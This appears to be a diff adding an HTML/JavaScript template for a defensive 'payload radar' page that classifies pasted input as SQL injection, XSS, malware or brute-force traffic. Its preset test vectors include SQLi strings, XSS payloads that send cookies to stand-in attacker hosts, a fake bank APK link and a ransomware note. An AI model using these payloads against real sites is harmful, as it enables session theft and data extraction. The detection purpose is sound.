@@ -1,0 +1,274 @@
+{% extends "base.html" %}
+
+{% block title %}Cyber Threat & Attack Payload Radar — ScamShield AI{% endblock %}
+{% block page_title %}Cyber Threat & Attack Payload Forensic Radar{% endblock %}
+
+{% block content %}
+<div style="display: flex; flex-direction: column; gap: 2rem; max-width: 1050px; margin: 0 auto;">
+
+  <!-- Hero Header Card -->
+  <div class="cyber-card" style="background: radial-gradient(circle at top right, rgba(0, 229, 255, 0.12), transparent 70%), var(--bg-card); border-color: rgba(0, 229, 255, 0.35);">
+    <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 1rem;">
+      <div style="max-width: 720px;">
+        <div style="display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(0, 229, 255, 0.1); border: 1px solid rgba(0, 229, 255, 0.3); padding: 0.35rem 0.85rem; border-radius: 9999px; font-size: 0.75rem; color: var(--accent-cyan); font-weight: 700; margin-bottom: 0.75rem;">
+          <span class="pulse-dot" style="background: var(--accent-cyan);"></span>
+          <span>Web & Payload Cyber Defense Radar</span>
+        </div>
+        <h2 style="font-size: 1.85rem; color: #fff; font-weight: 900; margin-bottom: 0.5rem; font-family: var(--font-display);">
+          Cyber Threat & Attack Payload Radar
+        </h2>
+        <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.6;">
+          Deconstruct dangerous payloads, detect <strong>SQL Injection (SQLi)</strong>, <strong>Cross-Site Scripting (XSS)</strong>, <strong>Malware / Ransomware APK signatures</strong>, and analyze <strong>DoS/DDoS & Brute-Force traffic anomalies</strong> in real-time.
+        </p>
+      </div>
+
+      <div style="display: flex; gap: 0.5rem;">
+        <span class="badge-risk low" style="border-color: rgba(0, 229, 255, 0.4); background: rgba(0, 229, 255, 0.08); color: var(--accent-cyan);">
+          ● Zero-API Heuristic Engine
+        </span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Attack Vectors Matrix (10 Capabilities) -->
+  <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem;">
+    <div class="cyber-card" style="padding: 1rem;">
+      <div style="font-size: 1.25rem; margin-bottom: 0.3rem;">💉</div>
+      <h4 style="font-size: 0.9rem; color: #fff; font-weight: 700;">SQL Injection (SQLi)</h4>
+      <p style="font-size: 0.78rem; color: var(--text-muted);">Detects boolean bypass (' OR 1=1), UNION extraction, and time-based sleep.</p>
+    </div>
+    <div class="cyber-card" style="padding: 1rem;">
+      <div style="font-size: 1.25rem; margin-bottom: 0.3rem;">⚡</div>
+      <h4 style="font-size: 0.9rem; color: #fff; font-weight: 700;">XSS (Cross-Site Scripting)</h4>
+      <p style="font-size: 0.78rem; color: var(--text-muted);">Flags script tags, DOM event handlers (onerror=), and cookie-stealing primitives.</p>
+    </div>
+    <div class="cyber-card" style="padding: 1rem;">
+      <div style="font-size: 1.25rem; margin-bottom: 0.3rem;">☣️</div>
+      <h4 style="font-size: 0.9rem; color: #fff; font-weight: 700;">Malware & Ransomware</h4>
+      <p style="font-size: 0.78rem; color: var(--text-muted);">Catches deceptive APKs, double extensions (.pdf.exe), and ransom note signatures.</p>
+    </div>
+    <div class="cyber-card" style="padding: 1rem;">
+      <div style="font-size: 1.25rem; margin-bottom: 0.3rem;">📊</div>
+      <h4 style="font-size: 0.9rem; color: #fff; font-weight: 700;">DoS / DDoS & Brute-Force</h4>
+      <p style="font-size: 0.78rem; color: var(--text-muted);">Analyzes rate-limiting spikes, authentication failure bursts, and MITM certificate alarms.</p>
+    </div>
+  </div>
+
+  <!-- Payload Inspector Form Card -->
+  <div class="cyber-card" id="radarCard">
+    <div class="cyber-card-header">
+      <div class="card-title-group">
+        <div class="card-icon" style="background: rgba(0, 229, 255, 0.12); color: var(--accent-cyan);">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+        </div>
+        <div>
+          <div class="card-title">Inspect String, Query Parameter, or Log Payload</div>
+          <div class="card-subtitle">Paste suspect web input, query string, server warning log, or file download string</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Quick Presets -->
+    <div class="samples-wrapper" style="margin-bottom: 1.25rem;">
+      <span class="samples-label">⚡ Test Vectors:</span>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('sqli')">💉 SQLi: ' OR 1=1 --</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('sqli_union')">💉 SQLi: UNION SELECT</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('xss_script')">⚡ XSS: &lt;script&gt;alert(1)&lt;/script&gt;</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('xss_onerror')">⚡ XSS: &lt;img onerror=alert()&gt;</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('apk_malware')">☣️ Fake Bank APK: sbi_update.apk</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('ransomware')">🔒 Ransomware Note Header</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('brute_force')">📊 Brute Force Login Burst</button>
+      <button type="button" class="sample-pill" onclick="loadPayloadPreset('safe_query')">✅ Benign Query: search?q=laptop</button>
+    </div>
+
+    <form id="payloadForm" onsubmit="handlePayloadScan(event)">
+      <div class="form-group">
+        <label class="form-label" for="payloadInputText">Enter suspect input payload or log string:</label>
+        <textarea
+          id="payloadInputText"
+          class="form-textarea"
+          rows="4"
+          placeholder="e.g. ' UNION SELECT username, password_hash FROM users WHERE '1'='1 or <svg/onload=fetch('//evil.com/?c='+document.cookie)>"
+          required
+        ></textarea>
+      </div>
+
+      <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
+        <button type="button" class="btn btn-secondary btn-sm" onclick="clearPayloadInput()">Clear</button>
+        <button type="submit" id="btnPayloadScan" class="btn btn-primary glow-btn" style="padding: 0.85rem 2.25rem;">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          <span id="btnPayloadText">Deconstruct & Analyze Payload</span>
+        </button>
+      </div>
+    </form>
+
+    <!-- Results Display -->
+    <div id="payloadResultsCard" style="display: none; margin-top: 2rem; border-top: 1px solid var(--border-color); padding-top: 1.75rem;">
+      <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; margin-bottom: 1.5rem;">
+        <div>
+          <span style="font-size: 0.72rem; text-transform: uppercase; color: var(--text-dim); font-weight: 700;">Attack Vector Classification</span>
+          <h3 style="font-size: 1.4rem; color: #fff; font-weight: 800;" id="plVector">Classification</h3>
+        </div>
+        <div>
+          <span id="plRiskBadge" class="badge-risk low">Low Risk</span>
+        </div>
+      </div>
+
+      <!-- Risk Meter Gauge -->
+      <div class="risk-meter-container" style="background: rgba(0,0,0,0.3); margin-bottom: 1.5rem;">
+        <div style="display: flex; align-items: center; gap: 1.5rem; width: 100%;">
+          <div class="risk-score-display" id="plScore" style="font-size: 3rem; font-weight: 900;">0</div>
+          <div style="flex: 1;">
+            <div style="font-size: 0.85rem; color: var(--text-muted); font-weight: 600; margin-bottom: 0.5rem;">
+              Threat Severity Index
+            </div>
+            <div class="risk-scale-bar" style="height: 12px; background: rgba(255,255,255,0.08); border-radius: 9999px; overflow: hidden;">
+              <div id="plScaleFill" class="risk-scale-fill low" style="width: 0%; height: 100%;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Detected Signatures -->
+      <div style="margin-bottom: 1.5rem;">
+        <h4 style="font-size: 1rem; color: #fff; font-weight: 700; margin-bottom: 0.6rem;">Matched Attack Signatures</h4>
+        <div class="indicators-list" id="plIndicatorsList"></div>
+      </div>
+
+      <!-- Security Remediation Actions -->
+      <div class="recommendations-box">
+        <h4 style="font-size: 1rem; font-weight: 700; color: var(--accent-cyan); margin-bottom: 0.6rem;">
+          🛡️ Engineering Defense & Remediation Protocols
+        </h4>
+        <ul class="recommendations-list" id="plRemediationList"></ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const PAYLOAD_PRESETS = {
+  sqli: "' OR '1'='1' --",
+  sqli_union: "' UNION ALL SELECT null, username, password_hash, email FROM information_schema.tables WHERE 'a'='a",
+  xss_script: "<script>document.location='http://evil-attacker.top/steal.php?cookie='+encodeURIComponent(document.cookie)<\/script>",
+  xss_onerror: "<img src=x onerror=\"fetch('http://attacker.xyz/?c='+document.cookie)\">",
+  apk_malware: "http://sbi-verification-notice.xyz/downloads/sbi_security_update.apk",
+  ransomware: "ATTENTION! All your documents, photos, and databases have been encrypted with RSA-4096. To decrypt your files, send 0.05 Bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa. Read README_DECRYPT.txt for instructions.",
+  brute_force: "CRITICAL ALERT: IP 185.220.101.5 failed login 45 times in 60 seconds against user 'admin'. Max login attempts exceeded, account locked, rate_limit_exceeded.",
+  safe_query: "https://shop.example.com/products/search?category=electronics&sort=price_asc&q=wireless+headphones"
+};
+
+function loadPayloadPreset(key) {
+  const p = PAYLOAD_PRESETS[key];
+  if (!p) return;
+  document.getElementById('payloadInputText').value = p;
+  showToast("Loaded attack payload vector", "info");
+}
+
+function clearPayloadInput() {
+  document.getElementById('payloadInputText').value = '';
+  document.getElementById('payloadResultsCard').style.display = 'none';
+}
+
+function handlePayloadScan(e) {
+  e.preventDefault();
+  const payload = document.getElementById('payloadInputText').value.trim();
+  if (!payload) {
+    showToast("Please enter a payload string", "error");
+    return;
+  }
+
+  const btn = document.getElementById('btnPayloadScan');
+  const btnText = document.getElementById('btnPayloadText');
+  btn.disabled = true;
+  btnText.textContent = "Deconstructing Threat Vectors...";
+
+  if (window.trigger3DLaserSweep) window.trigger3DLaserSweep('radarCard');
+
+  fetch('/api/scan/payload', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ payload: payload })
+  })
+  .then(res => res.json())
+  .then(data => {
+    btn.disabled = false;
+    btnText.textContent = "Deconstruct & Analyze Payload";
+
+    if (!data.success || !data.result) {
+      showToast(data.error || "Analysis failed", "error");
+      return;
+    }
+
+    renderPayloadResults(data.result);
+    if (window.CyberAudio) window.CyberAudio.playAlert(data.result.risk_level === 'High');
+    showToast("Payload inspection complete!", "success");
+  })
+  .catch(err => {
+    btn.disabled = false;
+    btnText.textContent = "Deconstruct & Analyze Payload";
+    showToast("Error connecting to detection engine", "error");
+  });
+}
+
+function renderPayloadResults(res) {
+  const card = document.getElementById('payloadResultsCard');
+  card.style.display = 'block';
+
+  document.getElementById('plVector').textContent = res.attack_vector;
+
+  const scoreElem = document.getElementById('plScore');
+  scoreElem.textContent = res.risk_score;
+  const riskClass = (res.risk_level || 'low').toLowerCase();
+  scoreElem.className = `risk-score-display ${riskClass}`;
+
+  const badge = document.getElementById('plRiskBadge');
+  badge.textContent = `${res.risk_level} Risk`;
+  badge.className = `badge-risk ${riskClass}`;
+
+  const scaleFill = document.getElementById('plScaleFill');
+  scaleFill.className = `risk-scale-fill ${riskClass}`;
+  scaleFill.style.width = `${res.risk_score}%`;
+
+  // Indicators
+  const indList = document.getElementById('plIndicatorsList');
+  indList.innerHTML = '';
+  if (!res.indicators || res.indicators.length === 0) {
+    indList.innerHTML = `<div class="indicator-item low"><div class="indicator-title">Benign Payload / Clean</div><div class="indicator-desc">Zero SQL injection, XSS, or malware signatures detected.</div></div>`;
+  } else {
+    res.indicators.forEach(ind => {
+      const sev = (ind.severity || 'low').toLowerCase();
+      const div = document.createElement('div');
+      div.className = `indicator-item ${sev}`;
+      div.innerHTML = `
+        <div class="indicator-item-header">
+          <span class="indicator-title">[${escapeHtml(ind.category)}] ${escapeHtml(ind.title)}</span>
+          <span class="badge-risk ${sev}">${escapeHtml(ind.severity)}</span>
+        </div>
+        <p class="indicator-desc">${escapeHtml(ind.desc)}</p>
+      `;
+      indList.appendChild(div);
+    });
+  }
+
+  // Remediation
+  const remList = document.getElementById('plRemediationList');
+  remList.innerHTML = '';
+  (res.remediation || []).forEach(r => {
+    const li = document.createElement('li');
+    li.textContent = r;
+    remList.appendChild(li);
+  });
+
+  card.scrollIntoView({ behavior: 'smooth' });
+}
+
+function escapeHtml(str) {
+  if (!str) return '';
+  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+}
+</script>
+{% endblock %}
